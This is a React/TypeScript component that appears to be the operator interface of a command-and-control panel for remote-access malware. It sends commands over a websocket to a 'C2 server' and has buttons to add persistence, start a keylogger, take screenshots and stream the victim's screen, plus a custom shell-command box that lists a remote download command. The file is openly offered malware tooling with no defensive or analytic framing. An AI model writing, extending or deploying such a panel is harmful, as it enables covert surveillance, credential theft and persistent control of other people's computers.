import { useState, useEffect } from 'react';
import { Card, Button, Input, Space, Typography, Row, Col, message } from 'antd';
import {
  SendOutlined,
  LockOutlined,
  FileImageOutlined,
  VideoCameraOutlined,
  StopOutlined,
  FileTextOutlined,
} from '@ant-design/icons';
import wsService from '../services/websocket';

const { Title, Text } = Typography;
const { TextArea } = Input;

function CommandCenter() {
  const [customCommand, setCustomCommand] = useState('');
  const [connected, setConnected] = useState(false);
  const [lastResponse, setLastResponse] = useState('');

  useEffect(() => {
    const handleMessage = (msg: any) => {
      if (msg.type === 'tcp_connected' || msg.type === 'connection_status') {
        setConnected(msg.connected || msg.type === 'tcp_connected');
      } else if (msg.type === 'tcp_disconnected') {
        setConnected(false);
      } else if (msg.type === 'tcp_response') {
        setLastResponse((prev) => prev + msg.data);
      }
    };

    wsService.addMessageHandler(handleMessage);

    return () => {
      wsService.removeMessageHandler(handleMessage);
    };
  }, []);

  const sendCommand = (cmd: string) => {
    if (!connected) {
      message.error('Not connected to C2 server');
      return;
    }

    try {
      wsService.sendCommand(cmd);
      message.success(`Command sent: ${cmd}`);
      setLastResponse('');
    } catch (error) {
      message.error('Failed to send command');
    }
  };

  const handleCustomCommand = () => {
    if (!customCommand.trim()) {
      message.warning('Please enter a command');
      return;
    }
    sendCommand(customCommand);
    setCustomCommand('');
  };

  const quickCommands = [
    { label: 'Who Am I', command: 'whoami', icon: <FileTextOutlined />, color: '#1890ff' },
    { label: 'Add Persistence', command: 'persist', icon: <LockOutlined />, color: '#fa8c16' },
    { label: 'Start Keylogger', command: 'keylog_start', icon: <FileTextOutlined />, color: '#52c41a' },
    { label: 'Take Screenshot', command: 'screenshot', icon: <FileImageOutlined />, color: '#722ed1' },
    { label: 'Start Live Screen', command: 'livescreen_start', icon: <VideoCameraOutlined />, color: '#eb2f96' },
    { label: 'Stop Live Screen', command: 'livescreen_stop', icon: <StopOutlined />, color: '#f5222d' },
  ];

  return (
    <div>
      <Title level={2}>Command Center</Title>

      <Card title="Quick Commands" style={{ marginTop: 24 }}>
        <Row gutter={[16, 16]}>
          {quickCommands.map((cmd, index) => (
            <Col xs={24} sm={12} md={8} key={index}>
              <Button
                type="primary"
                size="large"
                block
                icon={cmd.icon}
                style={{ background: cmd.color, borderColor: cmd.color, height: '60px' }}
                onClick={() => sendCommand(cmd.command)}
                disabled={!connected}
              >
                {cmd.label}
              </Button>
            </Col>
          ))}
        </Row>
      </Card>

      <Card title="Custom Command" style={{ marginTop: 24 }}>
        <Space.Compact style={{ width: '100%' }}>
          <Input
            placeholder="Enter custom command (e.g., dir, ipconfig, etc.)"
            value={customCommand}
            onChange={(e) => setCustomCommand(e.target.value)}
            onPressEnter={handleCustomCommand}
            disabled={!connected}
            size="large"
          />
          <Button
            type="primary"
            icon={<SendOutlined />}
            onClick={handleCustomCommand}
            disabled={!connected}
            size="large"
          >
            Send
          </Button>
        </Space.Compact>
        <Text type="secondary" style={{ marginTop: 8, display: 'block' }}>
          Available commands: whoami, persist, keylog_start, screenshot, dir, ipconfig, cd [path], download [url] [filename], etc.
        </Text>
      </Card>

      <Card title="Command Response" style={{ marginTop: 24 }}>
        <TextArea
          value={lastResponse || 'No response yet...'}
          rows={12}
          readOnly
          style={{
            fontFamily: 'Courier New, monospace',
            fontSize: '13px',
            background: '#1f1f1f',
            color: '#0f0',
          }}
        />
      </Card>
    </div>
  );
}

export default CommandCenter;
